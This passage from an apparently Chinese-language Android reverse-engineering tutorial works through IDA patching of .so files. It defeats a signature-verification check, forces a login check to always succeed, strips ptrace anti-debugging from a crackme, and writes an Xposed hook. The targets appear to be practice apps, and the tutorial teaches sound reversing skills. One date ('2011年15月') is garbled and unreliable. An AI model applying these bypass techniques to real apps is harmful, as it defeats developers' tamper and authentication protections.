33`代码。\n\n{% asset_img 7.png 注释33行代码 %}\n\n{% asset_img 8.png 显示str的值 %}\n\n任务三：添加Log打印出fun3里面int类型value3的值 \n\n将fun3的smali代码按照fun2的smali代码修改返回值类型。\n\n{% asset_img 9.png 修改返回值类型 %}\n\n{% asset_img 11.png 修改返回值类型 %}\n\n最后还要添加修改Log处的代码。\n\n{% asset_img 10.png 修改返回值类型 %}\n\n{% asset_img 12.png 显示value3的值 %}\n\n# 6. 编写第一个so\n\nAndroid开发中，我们经常会用到`.so`文件。原因有很多，比如部分方法不想暴露，如加密规则。比如部分秘钥需要存储，哪怕最简单的一个String我们使用.so调用获取这个String，也比直接明文写在代码中要来的安全。那么逆向破解也是一样， 为了避免以后破解so时知其然而不知其所以然，要破解一个so就得先学习这个so是怎么编写的。\n\n生成so文件需要NDK，由于本人安装NDK安装得太混乱了，出了各种各种的问题最后莫名其妙就成功了，所以以下步骤仅供参考，如果发现错误及时百度。\n\n创建一个native C++项目，一路next。\n\n{% asset_img C++.png C++ %}\n\n创建项目时会自动下载NDK，所以不用管。及时看build窗口信息，问题或异常会在build窗口显示。可以看到在`D:\\Java\\Android\\sdk\\ndk\\21.4.7075529`就下载好了ndk的21.4版本。\n\n打开Project的`local.properties`文件添加NDK路径。\n\n{% asset_img 配置DNK.png 配置NDK %}\n\n此时，可以在 File -> Project Structure -> SDK Location 就可以看到NDK路径了，说明NDK已经安装好并且能用了。\n\n{% asset_img 配置NDK.png 配置NDK %}\n\n那么现在就可以正式编写so文件了。在`MainActivity.java`的父目录里新建一个类，命名为`myJNI`。\n\n{% asset_img 新建类.jpg 新建一个类 %}\n\n声明native方法。这个类是java与C/C++交互的中介，方法由java声明，由C/C++实现。\n\n```java\npublic class myJNI {\n　　//加载so库\n    static {\n        System.loadLibrary(\"JniTest\");//so库名字\n    }\n　　//native方法\n    public static native String sayHello();//在so库里增加sayHello()功能\n}\n```\n\n在左侧栏右键`myJNI.java`，复制路径，在AS下面的终端编译`myJNI`类，生成`myJNI.class`文件。由于注释出错(?)，所以我把注释去掉了。\n\n```\njavac D:\\Java\\Android\\MyApplication4\\app\\src\\main\\java\\com\\example\\myapplication\\myJNI.java\n```\n\n{% asset_img 编译class文件.png 生成class文件 %}\n\n记住包名为`com.example.myapplication`，类名为`myJNI`。在AS终端上去到java目录，生成`.h`头文件。\n\n```\njavah -jni com.example.myapplication.myJNI\n```\n\n{% asset_img 生成头文件.png 生成头文件 %}\n\n将生成的头文件拖到cpp目录下，并且将`native-lib.cpp`强制删去。在cpp目录下新建`.c`文件。\n\n{% asset_img 新建main.jpg 新建c文件 %}\n\n将文件头包括进来，实现sayHello()方法。\n\n```c\n#include \"com_example_myapplication_myJNI.h\"\nJNIEXPORT jstring JNICALL Java_com_example_myapplication_myJNI_sayHello(JNIEnv *env, jclass jobj)\n{\n    return (*env)->NewStringUTF(env,\"hello 52pojie!\");\n}\n```\n\n由于我们使用CMake来生成so的, 所以要修改`CMakeLists.txt`来指定so名称和so的源文件的相对路径。点击上方“大象”同步一下。\n\n{% asset_img 修改名称.png so名称和so的源文件的相对路径 %}\n\n完成以上步骤之后，生成release版本的apk，要不然将来想要修改`.so`文件后不能在模拟器上运行。\n\n生成的so在`app\\build\\intermediates\\cmake\\debug\\obj\\`和`app\\build\\intermediates\\merged_native_libs\\debug\\out\\lib`和`app\\build\\intermediates\\stripped_native_libs\\debug\\out\\lib\\`。为什么相同的东西要分别放在三个地方，不懂。随便一个目录看看：\n\n{% asset_img jniso.png libjnitest.so %}\n\n发现这几个目录里面都有`libJniTest.so`，不同处理器使用的文件不一样。雷电模拟器就是x86架构的。\n\n- armeabi-v7a: 第7代及以上的 ARM 处理器。2011年15月以后的生产的大部分Android设备都使用它。\n- arm64-v8a: 第8代、64位ARM处理器，很少设备，三星 Galaxy S6是其中之一。\n- armeabi: 第5代、第6代的ARM处理器，早期的手机用的比较多。\n- x86: 平板、模拟器用得比较多。\n- x86_64: 64位的平板。\n\n 在`app/src/main`下新建`jnilib`目录, 并将生成的SO文件拷贝到该文件夹下。\n\n{% asset_img 拷贝so.png SO文件拷贝到该文件夹下 %}\n\n打开`MainActivity.java`插入一条log来调用so中的`sayHello`方法，并连接模拟器调试。\n\n{% asset_img sayhello.png 插入一条log %}\n\n{% asset_img 52pj.png 插入一条log %}\n\n# 7. IDA破解第一个so\n\n## 7.1 预备知识与环境配置\n\n下载最新版`apktool.jar`和`apktool.bat`一起放到`C:\\Windows`目录下，不想下载也可以在AK目录下找到它们，大概在`D:\\Java\\AndroidKiller_v1.3.1\\bin\\apktool`，再放到`C:\\Windows`。不想放到`C:\\Windows`也可以把环境变量设到上面路径中，随你喜欢。反正最后的结果是可以在命令窗口使用apktool。记住两个关键命令：\n\n```java\napktool d test.apk\t\t//解包\napktool b test\t\t\t//重打包\n```\n\n{% asset_img 解包.png 解包 %}\n\n{% asset_img 重打包.png 重打包 %}\n\n重打包后的apk由于没有签名，所以这里需要对重打包后的apk进行签名后才能在手机上安装并运行。打开AK，工具->APK签名，将要签名的apk拖拉到软件中进行签名，点执行后将会在当前目录生成`hello_sign.apk`。\n\n{% asset_img 签名.png 签名 %}\n\n## 7.2 破解so文件\n\n打开AS，在`Logcat`模块连接好模拟器，将`.apk`文件安装到模拟器上，运行`.apk`，回到`Logcat`搜索“52pojie”。\n\n{% asset_img 52pojie.png 调用sayhello方法 %}\n\n我们的目的是修改这句话。\n\n在主机上将`.apk`解包后，进入lib目录，发现有4个目录。\n\n{% asset_img lib.png lib目录 %}\n\n那我们用IDA(这里用IDAv6.6，因为IDAv7.0没有`modifyfile`插件)打开`x86`目录下的so文件，Shift + F12打开字符串窗口，Ctrl + F 查找“52pojie”，双击进入找到其内存地址。\n\n{% asset_img 内存地址.png 52pojie内存地址 %}\n\n选中字符串，按照下图操作去到十六进制视图。\n\n{% asset_img hexodump.jpg hex dump %}\n\n将我们想写入的内容转换为十六进制。\n\n{% asset_img 16进制转换.png 转换为16进制 %}\n\n```asm\n68 65 6c 6c 6f 20 76 35 6c 65 30 6e 39\n```\n\n回到IDA，选中需要修改的首字节右键->Edit。\n\n{% asset_img 16进制编辑.png 编辑字符串 %}\n\n修改好，再次右键->Apply changes。\n\nEdit -> Plugins -> modifyfile -> 确认更改。另存到某处。\n\n{% asset_img modifyfile.jpg modifyfile %}\n\n如果lib目录中有多种模式，如果修改32位`.so`则把所有32位处理器目录下的`.so`都更换为新的`.so`文件，64位同理。我们只修改的是32位的，所以只要在`x86`目录下替换即可。\n\n重新打包并签名。安装在模拟器上，运行。\n\n{% asset_img so.png 修改so文件成功 %}\n\n# 8. IDA爆破签名验证(IDA静态分析)\n\n我发现会飞的丑小鸭特别油麦，下面是他为了引出主题写的一个场景，我觉得特别逗就拿过来给你们看看。\n\n> 李华是一个很有天赋 的Android程序员 他用了半年时间含辛茹苦，挑灯夜战，摧枯拉朽的编写了一款黑宝宝游戏。当然这几个词形容的并不恰当，但是李华确实为了这个apk的上线付出了很多努力。谁知游戏刚一上线就被破解了，生不生气？难不难过？\n>\n> 吸取了这次的教训，李华决定要反击。他通过书籍了解到一个apk只有一个签名，于是他有了一个很大胆的想法：如果别人要破解我的apk，他一定会对我的apk进行重打包，但是重打包后的签名就不是我原来的签名了，我可以在代码中判断，如果签名不是我的签名，那么就让程序退出。这样不就达到防止别人破解的目的了，哈哈哈，太佩服我自己了。\n>\n> 他知道你最近在学习Android逆向，他想在游戏上线前让你测试一下他新加的签名验证是否能防住别人的破解。\n> 下面是李华编写的黑宝宝apk\n> 链接：https://pan.baidu.com/s/1h6pX2ARE3qtiKiYbcnJ-3g 密码：duv5\n>\n> 你拿到这个apk直接反编译重打包后安装到手机上，刚一运行程序就退出，你懵了，明明我什么都没改！接着看了一会反编译后的代码说：他的签名验证是写在so里面的，但是我不会so的破解，大哥你教教我吧！\n>\n> 我说：好吧！\n>\n> 下面开始本节课的课程，请同学们认真听课。\n\n用apktool解包apk后将项目载入AS，在`myJNI.smali`里有`check`函数，应该就是验证签名是否一致的函数。\n\n{% asset_img check.png check函数 %}\n\n将`libJniTest.so`载入IDA，需要注意的是，IDA众多窗口中，有两个窗口与so有关：Exports窗口是导出表，能让外部调用so中的函数；Imports窗口是导入表，能让so调用外部的函数。所以根据上面的信息，so里有check函数，所以check可以被外部调用，应该在导出表里找check函数。\n\n{% asset_img exports.png 导出表 %}\n\n双击进去到汇编代码，F5进入反汇编代码。谁能想到`armeabi`目录下的`.so`文件需要IDA32才能反编译呢，果断把文件载入IDA32。\n\n以下两种情况是根据不同版本的IDA对so文件修改的处理。\n\n## IDAv7.0+\n\n去到反汇编代码后，看到很多字符串，暂时我们还不知道有什么用，但我们熟悉Log，下面这三条应该是输出Log语句。\n\n{% asset_img print.png 导出表 %}\n\n先进去`unk_223C`看看里面是什么。好吧，就算16进制转文本也翻译不出来。\n\n```asm\n4A 4E 49 E8 8E B7 E5 8F 96 E5 88 B0 E7 9A 84 E7 AD BE E5 \nJ  N  I\n90 8D E6 98 AF 25 73\n\t\t\t    %  s\n```\n\n那就在模拟器运行一下用AS获取Log吧。\n\n{% asset_img 获取签名.png 出现Log %}\n\n再拿去16进制转文本，这跟上面的16进制代码有半毛钱关系吗？！这里我真不知道怎么回事，哪位大牛来告诉我。\n\n{% asset_img 16进制转文本.png 16进制转文本 %}\n\n已知那一大串数字是签名，如果v9与字符串一致，则跳到`unk_261A`显示“签名一致”，那`unk_262E`自然就是“签名不一致”，退出程序。我们破解的思路是，就算v9与字符串不一致，也要让它跳到`unk_261A`去。\n\n回到汇编视图，在左侧的函数窗口找到`check`函数双击来到图形化窗口，找到关键跳转。\n\n{% asset_img 汇编.png 关键跳转 %}\n\nBNE：数据跳转指令，标志寄存器中Z标志位不等于零时, 跳转到BNE后标签处。\nBEQ：数据跳转指令，标志寄存器中Z标志位等于零时, 跳转到BEQ后标签处。\n\n所以我们把`BNE`修改为`BEQ`即可。`BNE`的机器码为`D1`，`BEQ`的机器码为`D0`。按照下图操作修改机器码。\n\n{% asset_img 修改字节.jpg 修改字节 %}\n\n修改完后保存so文件。\n\n{% asset_img 保存so文件.jpg 保存so文件 %}\n\n{% asset_img bak.png 保存备份 %}\n\n把`armeabi`和`armeabi-v7a`下的`libJniTest.so`替换成修改后的so，再删掉`x86`目录。打包签名。\n\n这里为什么要删掉`x86`目录，可能是因为雷电模拟器是x86架构的，它默认使用`x86`目录下的`libJniTest.so`，所以删掉才有可能使用`armeabi`或`armeabi-v7a`目录下的`libJniTest.so`。\n\n## IDAv6.6\n\n去到反汇编代码后，看到一条很长的字符串，暂时我们还不知道有什么用，但我们熟悉Log，下面这三条应该是输出Log语句。\n\n{% asset_img 字符串.png Log语句 %}\n\n由于中文乱码，所以设置编码为UTF-8，Options ->  ASCII string style -> Set default encodings -> 8-bit... -> Change -> UTF-8 -> OK。\n\n{% asset_img string.png 设置编码 %}\n\nF5重新反编译一下，乱码问题解决。\n\n{% asset_img 解决乱码.png 解决编码 %}\n\n分析一下程序流程，`getSignature`是获取程序签名，获取的签名与那一长串比较，如果相等则“签名一致”。破解的思路是即使获取的签名与存储的签名不一致，也可以让程序跳到“签名一致”处，本质就是修改跳转指令。\n\n回到汇编视图，在左侧的函数窗口找到`check`函数双击，按空格来到图形化窗口，找到关键跳转。\n\n{% asset_img 跳转.png 关键跳转 %}\n\nBNE：数据跳转指令，标志寄存器中Z标志位不等于零时, 跳转到BNE后标签处。\nBEQ：数据跳转指令，标志寄存器中Z标志位等于零时, 跳转到BEQ后标签处。\n\n所以我们把`BNE`修改为`BEQ`即可。`BNE`的机器码为`D1`，`BEQ`的机器码为`D0`。老方法，去到hex dump处修改十六进制代码。保存so文件，删掉`x86`目录，打包签名。\n\n# 9. IDA动态破解登录验证\n\n## 9.1 预备知识与环境配置\n\njeb工具的使用 https://www.52pojie.cn/thread-742250-1-1.html\n\n我觉得jeb就是AK+AS，可以看看，如果熟悉AK和AS，jeb很容易上手。jeb的优点是反编译回Java的可读性比AK强。\n\nAndroid逆向必会命令 https://www.52pojie.cn/thread-742284-1-1.html\n\n连手机和连模拟器是一模一样的命令，不需要担心。\n\nso文件如果是arm架构的，用x86架构的雷电模拟器可能会出问题，所以最好用真机或安卓原生模拟器或Genymotion调试。真机需要root权限，否则IDA在附加上程序时出现不了包名。但小米手机不是默认root，搞个root权限要花很长时间。原生模拟器也太卡了...但卡归卡，调试时还是很友好的。Genymotion会出现各种各样的问题，我佛了。\n\nGenymotion安装及ARM支持 https://blog.csdn.net/fidelhl/article/details/85239238 \n\nGenymotion-ARM-Translation  https://www.jianshu.com/p/97b8250f359e \n\nadb devices检测不到genymotion模拟器 https://blog.csdn.net/qq_15158911/article/details/75304011 \n\n关闭端口：\n\n```\nC:\\Users\\dell>netstat -ano | findstr 23946\n  TCP    127.0.0.1:23946        0.0.0.0:0              LISTENING       13752\n\nC:\\Users\\dell>taskkill -pid 13752 -f\n成功: 已终止 PID 为 13752 的进程。\n```\n\n## 9.2 动态破解登录验证\n\n拿到一个`.apk`程序，先在模拟器上安装，运行一下熟悉流程。程序与第8节的几乎一样，但第8节的程序没有`android:debuggable=\"true\"`。\n\n将`.apk`文件用AK打开，因为需要调试，所以必须保证`application`标签里的` android:debuggable=\"true\"`。\n\n{% asset_img debug.png android:debuggable=\"true\" %}\n\n找到MainActivity入口类，并反编译成java代码。通过静态分析java代码可知，用户在输入用户名和密码后程序会调用Native方法check。\n\n{% asset_img 13.png MainActivity %}\n\n{% asset_img 14.png jni %}\n\n解包将`libJniTest.so`载入IDA分析check方法的具体实现。这个程序有3个lib，具体分析哪个`libJniTest.so`，看模拟器或真机默认使用哪个so。Genymotion虽然安装了arm架构，但如果有`x86`的so文件它还是使用`x86`目录下的。真机是arm架构的，用`armeabi-v7a`或`armeabi`都没问题，但修改完后要把两个目录下的so文件都替换成新的。\n\n将x86目录下的so文件载入IDA，几乎与armeabi目录下的差不多，但汇编代码是我们熟悉的PC逆向，感觉来了！\n\n{% asset_img 9.2.8.png IDA反编译 %}\n\n{% asset_img 9.2.9.png 汇编代码 %}\n\n开始动态调试。将`IDA_Pro_7.5\\dbgsrv`目录下的`android_x86_server` push 到模拟器`/data/local/tmp/`目录下，给777权限并运行`android_x86_server`。注意，真机 push `android_server`。\n\n```\nC:\\Users\\dell>adb push D:\\CTF\\tools\\IDA_Pro_v7.5\\dbgsrv\\android_x86_server /data/local/tmp\nD:\\CTF\\tools\\IDA_Pro_v7.5\\dbgsrv\\android_x86_server: 1 file pushed, 0 skipped. 693.5 MB/s (1130104 bytes in 0.002s)\n\nC:\\Users\\dell>adb shell\nvbox86p:/ # cd /data/local/tmp\nvbox86p:/data/local/tmp # ls -al\ntotal 1900\ndrwxrwx--x 2 shell shell    4096 2022-03-08 19:53 .\ndrwxr-x--x 3 root  root     4096 2022-03-07 00:13 ..\n-rwxrwxrwx 1 root  root   786868 2020-12-31 11:00 android_server\n-rw-rw-rw- 1 root  root  1130104 2020-12-31 11:00 android_x86_server\nvbox86p:/data/local/tmp # chmod 777 android_x86_server\nvbox86p:/data/local/tmp # ./android_x86_server\nIDA Android x86 32-bit remote debug server(ST) v7.5.26. Hex-Rays (c) 2004-2020\nListening on 0.0.0.0:23946...\n```\n\n新开一个cmd，执行端口转发命令：\n\n```\nC:\\Users\\dell>adb forward tcp:23946 tcp:23946\n23946\n```\n\n模拟器运行该程序，回到刚才打开的IDA，确保已经载入主机该程序的so文件，且与模拟器使用的so文件一致。Debugger -> Select debugger 。选择Linux debugger。\n\n{% asset_img 9.2.10.png Linux debugger %}\n\nDebugger -> Process options ，确认端口号。\n\n{% asset_img 9.2.11.png Linux 确认端口号 %}\n\nDebugger -> Attach to process ，找到我们需要附加的包名。\n\n{% asset_img 9.2.12.png Linux 附加包名 %}\n\n确认so文件是否一致。\n\n{% asset_img 9.2.13.png so文件一致 %}\n\n等它加载，在某个地方停下来，此时，EIP指向停止处。\n\n{% asset_img 9.2.14.png 载入界面 %}\n\nCtrl + S找so文件，找到有执行权限且最开始的so文件。\n\n{% asset_img 9.2.15.png 有执行权限的so文件 %}\n\n或在Modules窗口找so文件，在so文件里找check方法。\n\n{% asset_img 9.2.16.png 汇编代码 %}\n\n也可以F5查看伪代码，根据伪代码在汇编代码中找到几个跳转语句下断。\n\n{% asset_img 9.2.17.png 下断 %}\n\nF9运行程序，输入用户名555和密码3333，点击登录，IDA停在第一个断点处。因为我们没有重新编译签名，所以签名是一致的，不跳转，继续往下执行。\n\n{% asset_img 9.2.18.png 第一个断点处 %}\n\nF8往下执行或F9来到下个断点处，可以看到寄存器窗口ESI指向我们输入的用户名，EDI指向真正的用户名，将两个进行对比，由于不一致，所以跳转实现。第三个断点一样，不再赘述。\n\n{% asset_img 9.2.19.png 第二个断点处 %}\n\n接下来修改，因为我们修改完so文件，要重新编译打包签名，所以签名校验一定要绕过，用户名和密码也要爆破，所以总共要修改三处跳转。\n\n`jz`的机器码为74，`jnz`的机器码为75。选中要修改的字节，Edit -> Patch program -> Change Byte 。\n\n{% asset_img 9.2.20.png 修改程序 %}\n\nEdit -> Patch program -> Apply patches to input file ，保存so文件。重打包，在AK中签名。模拟器安装程序，验证，登录成功。\n\n{% asset_img 9.2.21.png 运行成功 %}\n\n注意，我们只修改了x86目录下的so文件，如果想要程序在所有架构都能“登录成功”，必须要修改它所有拥有的so文件。\n\n# 10. 动态调试反调试apk\n\n## 10.1 反调试及反反调试\n\n### 10.1.1 IDA调试端口检测\n\n原理：调试器远程调试时，会占用一些固定的端口号，如23946。\n\n解决方法：修改调试端口号。端口号范围从0到65535，0不使用，1到1023为BSD保留端口，也是系统端口，1024到5000是BSD临时端口，5001到65535为用户自定义端口。\n\n```\n./android_server -p6666\n```\n\n### 10.1.2 调试器进程名检测\n\n原理：远程调试要在手机中运行`android_server`、`gdbserver`、`gdb`等进程。\n\n解决方法：修改调试器server名字。\n\n```\nrename android_server heiboy\n```\n\n### 10.1.3 ptrace检测\n\n原理：一个进程只能被ptrace一次，可以自己ptrace自己，如果被调试器ptrace了，自己ptrace肯定ptrace不了，根据返回值进行判断。\n\n解决方法：\n\n1. 修改系统源码，让ptrace返回值恒为0\n2. hook ptrace\n\n## 10.2 反反调试apk\n\n拿到一个`.apk`程序，先在AS原生模拟器上安装，运行一下熟悉流程。如果只有arm架构so文件的最好用AS原生模拟器，因为genymotion即使支持arm架构还是调试不了。\n\n```\nadb install AliCrackme_2_killer.apk\n```\n\n{% asset_img 9.2.1.png 运行程序 %}\n\n将`.apk`文件用AK打开，因为需要调试，所以必须保证`application`标签里有` android:debuggable=\"true\"`。如果没有必须加上，重新编译打包，卸载模拟器里的程序，重新安装。\n\n{% asset_img 10.1.png android:debuggable=\"true\" %}\n\n找到MainActivity入口类，并反编译成java代码。通过静态分析java代码可知，程序调用了Native方法`securityCheck`，且放在了`libcrackme.so`文件中。\n\n{% asset_img jni.png MainActivityjava代码 %}\n\n解包发现只有`armeabi`目录的`libcrackme.so`，载入IDA分析`securityCheck`方法的具体实现，伪代码和汇编代码配合使用。\n\n{% asset_img 10.2.png 汇编代码 %}\n\n{% asset_img 9.2.2.png 伪代码分析 %}\n\n盲猜 v5 == v3，但很遗憾，失败了，所以v3一定是经过某种转换才等于“wojiushidaan”。选中v5后面的v3右键->Set Ivar Type，通过`JNIEnv*`还原类似((_DWORD )v3 + 676))格式的指令。\n\n{% asset_img 9.2.3.png JNIEnv* %}\n\n{% asset_img 9.2.4.png GetStringUTFChars %}\n\n要想知道怎么变换，需要动态调试`libcrackme.so`文件。\n\n打开cmd，将`IDA_Pro_v7.5\\dbgsrv`目录下的`android_server` push 到模拟器`/data/local/tmp/`目录下，给777权限并运行`android_server`。\n\n```\nC:\\Users\\dell>adb push D:\\CTF\\tools\\IDA_Pro_v7.5\\dbgsrv\\android_server /data/local/tmp\nD:\\CTF\\tools\\IDA_Pro_v7.5\\dbgsrv\\android_server: 1 file pushed, 0 skipped. 494.3 MB/s (589588 bytes in 0.001s)\n\nC:\\Users\\dell>adb shell\nvbox86p:/ # cd /data/local/tmp\nvbox86p:/data/local/tmp # ls -al\ntotal 596\ndrwxrwx--x 2 shell shell   4096 2022-03-07 09:01 .\ndrwxr-x--x 3 root  root    4096 2022-03-07 00:13 ..\n-rw-rw-rw- 1 root  root  589588 2017-09-14 03:08 android_server\nvbox86p:/data/local/tmp # chmod 777 android_server\nvbox86p:/data/local/tmp # ./android_server\nIDA Android 32-bit remote debug server(ST) v1.22. Hex-Rays (c) 2004-2017\nListening on 0.0.0.0:23946...\n```\n\n新开一个cmd，执行端口转发命令：\n\n```\nC:\\Users\\dell>adb forward tcp:23946 tcp:23946\n23946\n```\n\n按照第9节的照做一遍，PC指向程序停止处。 Ctrl + S 找到有执行权限的`libcrackme.so`，在Modules窗口找到的`securityCheck`函数的图形化界面竟然没有显示“wojiushidaan”，而是“aiyou,bucuoo”。\n\n{% asset_img 10.3.png 汇编代码 %}\n\n回到汇编代码再函数起始处下断，F9运行，程序直接退出。说明程序有反调试功能。\n\n{% asset_img 10.7.png 下断点 %}\n\n先不管那么多，输入“aiyou,bucuoo”试试，成功了！\n\n{% asset_img 10.4.png 输入校验码 %}\n\n好啦好啦你肯定又跟我说我学的是破解！回归正题，反调试的基本原理是这样的：IDA使用android_server在root环境下注入到被调试的进程中，用到的技术是Linux中的ptrace，当Android中的一个进程被另外一个进程ptrace之后，在其status文件中有一个字段TracerPid可以标识是被哪一个进程trace了(Linux中的/proc/pid/status文件)。这里有两个地方是so动态加载完毕前执行的，`.init_array`是一个so最先加载的一个段信息，时机最早，现在一般so解密操作都是在这里做的；`JNI_OnLoad`是so被System.loadLibrary调用的时候执行的，它的时机早于native方法的执行。\n\n反调试机制很可能在`JNI_Onload`处就让程序退出的，所以我们得先去掉反调试机制，才能继续进行破解。那如何断在`JNI_OnLoad`函数指令处呢？Debugger -> Debugger options -> 勾选下面三个选项。\n\n{% asset_img 三选项.png 三个选项 %}\n\n这三个选项意味着：\n\n- 第一个：在APK程序入口处停止。\n- 第二个：有线程启动运行或者退出时，暂停。\n- 第三个：当动态库（apk中的so文件）加载或者取消加载时，暂停。\n\n但是由于被调试程序一运行就会执行static中的语句，因此需要让程序停在加载so文件之前，故可以使用debug方式来启动：\n\n```\nC:\\Users\\dell>adb shell am start -D -n com.yaotong.crackme/.MainActivity\nStarting: Intent { cmp=com.yaotong.crackme/.MainActivity }\n```\n\n在载入so文件的IDA下点击 Debugger -> Attach to process ，找到我们需要附加的包名。等它加载到PC停止。\n\n此时，so文件还没有被加载到内存中去，所以还要让程序跑起来。启动 DDMS（进入sdk安装目录`\\sdk\\tools`下，运行` monitor.bat `脚本启动），在DDMS上选择相应进程后，使用指令使apk继续运行，成功后，DDMS上进程将显示绿色，否则是红色。\n\n{% asset_img DDMS.png 在DDMS上选择相应进程 %}\n\n```\nC:\\Users\\dell>jdb -connect com.sun.jdi.SocketAttach:port=8700,hostname=localhost\n设置未捕获的java.lang.Throwable\n设置延迟的未捕获的java.lang.Throwable\n正在初始化jdb...\n>\n```\n\n{% asset_img DDMS2.png 显示绿色 %}\n\n如果在DDMS中找不到相应进程，点一下重置adb，再选中目标进程，输入命令。\n\n{% asset_img reset.jpg 重置adb %}\n\n点击运行几次，直至弹窗。\n\n{% asset_img 10.6.png 弹窗 %}\n\nCtrl + S 看到有执行权限的`libcrackme.so`文件，在Modulus窗口找到`libcrackme.so`中的`JNI_Oload`函数，在函数起始处下断，F9运行。\n\n{% asset_img 10.6.jpg 下断运行 %}\n\n然后F8步过，来到此位置。经多次调试，运行到`BLX R7`时会跳到另一段代码处。这段代码的用途是创建线程。\n\n{% asset_img 10.8.jpg 创建线程 %}\n\n为什么要在`JNI_Oload`里创建线程呢？很有可能是ptrace检测。` thread_create`函数在`init_array`段里，这个函数创建了一个线程循环来读取`/proc/pid/status`文件下的TracePid的值，如果大于0说明程序正在被调试，退出程序。直接nop掉这行代码试试。arm的`ANDEQ R0`对应x86的`nop`，机器码为`00 00`。\n\n{% asset_img 10.9.png nop掉创建线程 %}\n\n保存，重打包，签名。现在用第9节的方法再试一遍，看是否能在`libcrackme.so`中的`securityCheck`方法中断下来。先下断点，再在app中输入密码，点击按钮，IDA成功停在断点处。\n\n{% asset_img 10.10.png 停在断点处 %}\n\n接下来如何破解？F8步过，运行到此处，查看R0寄存器，存的是输入的“555”。\n\n{% asset_img 10.11.png R0寄存器 %}\n\n{% asset_img 10.12.png 代码分析 %}\n\n如果要使输入任何都成功，则需要修改循环里的两个跳转语句。呃不知道为什么这里BNE的机器码不是`D1`，所以只能全都改为nop语句也是可以的。\n\n{% asset_img 10.13.png BNE %}\n\n{% asset_img 10.14.png nop %}\n\n卸载模拟器中旧的app：\n\n```\nadb uninstall com.yaotong.crackme\n```\n\n安装新的，运行。无论输入什么都会跳转到成功页面。\n\n{% asset_img 10.15.png 成功 %}\n\n# 11. 编写Xposed模块\n\nXpose是一款特殊的安卓应用，诞生于著名的XDA论坛，它的原理是替换安卓系统`/system/bin`目录下的app_process来控制zygote进程，使得app_pross在启动时会加载`XposedBridge.jar`，从而实现对zygode进程以及其创建的虚拟机的劫持，最终对系统的某些功能实现接管。\n\n优点：Xpose可以在我们不破坏apk自身的情况下实现对函数的hook，修改函数的参数和返回值，改变函数的结构并执行我们自己的代码，用好了Xposed可以对我们的逆向过程起到事半功倍的作用。\n\n缺点：本身不能对so中的函数进行修改，需要结合其他框架。 \n\n在模拟器上安装Xposed框架 https://blog.csdn.net/weixin_48140105/article/details/118359568 \n\n编写一个Xposed模块，也就是开发一个安卓app。和普通程序本质上是一样的，不一样的点在于：\n\n- 让EdXposed知道我们安装的这个程序是个Xposed模块。\n- 模块里要包含有Xposed的API的jar包，以实现下一步的hook操作。\n- 这个模块里面要有对目标程序进行hook操作的方法。\n- 要让手机上的Xposed框架知道，我们编写的Xposed模块中，哪一个方法是实现hook操作的，也就是hook类的入口。\n\n先在AS中创建一个Empty Activity项目，在界面创建一个按钮，实现某种功能。\n\n{% asset_img 11.8.png 增加按钮 %}\n\n在`MainActivity.java`中编写实现按钮功能代码。\n\n```java\npackage com.example.xposemk;\n\nimport androidx.appcompat.app.AppCompatActivity;\nimport android.os.Bundle;\nimport android.view.View;\nimport android.widget.Button;\nimport android.widget.Toast;\n\npublic class MainActivity extends AppCompatActivity {\n    private Button mBtn;\n\n    @Override\n    protected void onCreate(Bundle savedInstanceState) {\n        super.onCreate(savedInstanceState);\n        setContentView(R.layout.activity_main);\n        mBtn = (Button) findViewById(R.id.btn);\n        mBtn.setOnClickListener(new View.OnClickListener(){\n            @Override\n            public void onClick(View v){\n                Toast.makeText(MainActivity.this, message(), Toast.LENGTH_SHORT).show();\n            }\n        });\n    }\n    public String message() {\n        return \"红红火火恍恍惚惚\";\n    }\n}\n```\n\n连接好模拟器，安装app运行。\n\n{% asset_img 11.9.png 正常运行 %}\n\n现在通过编写一个Xposed模块修改按钮被点击后显示的弹框信息。\n\n下载XposedBridgeAPI模块 https://github.com/924587628/XposedBridgeAPI ，将下载的API拖进libs文件夹。\n\n{% asset_img 11.2.png 拖进libs文件夹 %}\n\n右击jar包 -> Add As Library -> OK。\n\napp -> src -> main -> AndroidManifest.xml ，在`application`标签中加入Xpose配置信息。\n\n```\n<meta-data\n        android:name=\"xposedmodule\"\n        android:value=\"true\" />\n<meta-data\n        android:name=\"xposeddescription\"\n        android:value=\"Easy example\" />\n<meta-data\n        android:name=\"xposedminversion\"\n        android:value=\"89\" />\n```\n\n{% asset_img 11.3.png Xposed %}\n\napp -> build.gradle，在dependencies段里修改。\n\n```\ndependencies {\n    ...\n    compileOnly files('libs\\\\XposedBridgeAPI-89.jar')\n}\n```\n\n{% asset_img 11.4.png compileOnly %}\n\n在`MainActivity.java`同目录里新建一个`hook.java`，代码如下：\n\n```java\npackage com.example.xposemk;\nimport de.robv.android.xposed.IXposedHookLoadPackage;\nimport de.robv.android.xposed.XC_MethodHook;\nimport de.robv.android.xposed.XposedBridge;\nimport de.robv.android.xposed.XposedHelpers;\nimport de.robv.android.xposed.callbacks.XC_LoadPackage;\n\npublic class hook implements IXposedHookLoadPackage{\n    @Override\n    public void handleLoadPackage(XC_LoadPackage.LoadPackageParam loadPackageParam) throws Throwable{\n        if(loadPackageParam.packageName.equals(\"com.example.xposemk\")){\n            XposedBridge.log(\"hooking...\");\n            Class cls = loadPackageParam.classLoader.loadClass(\"com.example.xposemk.MainActivity\");\n            XposedHelpers.findAndHookMethod(cls, \"message\", new XC_MethodHook(){\n                @Override\n                protected void beforeHookedMethod(MethodHookParam param) throws Throwable{\n                    super.beforeHookedMethod(param);\n                }\n                @Override\n                protected void afterHookedMethod(MethodHookParam param) throws Throwable{\n                    Object obj = param.getResult();\n                    XposedBridge.log(obj.toString());\n                    param.setResult(\"biubiubiu\");\n                }\n            });\n        }\n    }\n}\n```\n\n右击main，New -> Folder -> Assets Folder。main -> assets 右键 -> New -> file ，新建`xposed_init`文件，将内容编辑为包名+类名。\n\n{% asset_img 11.6.png Xposed_init文件 %}\n\n{% asset_img 11.7.png 包名+类名 %}\n\n模拟器卸载原本的app，重新安装。打开Xposed Installer，在模块栏勾选对应进程。\n\n{% asset_img 11.11.png Xposed Installer勾选对应进程 %}\n\n重启模拟器，运行app，发现显示的弹框信息已被修改。\n\n{% asset_img 11.10.png 弹框信息已被修改 %}\n\n# 12. Xpose实战\n\nhook一个函数需要知道以下三点：\n(1)方法的包名+类名\n(2)方法名\n(3)方法的参数类型 \n\n{% asset_img 12.1.png 解锁失败 %}\n\n用jeb打开apk，查看`MainActivity`反编译的源码。\n\n{% asset_img 12.2.png 查看源码 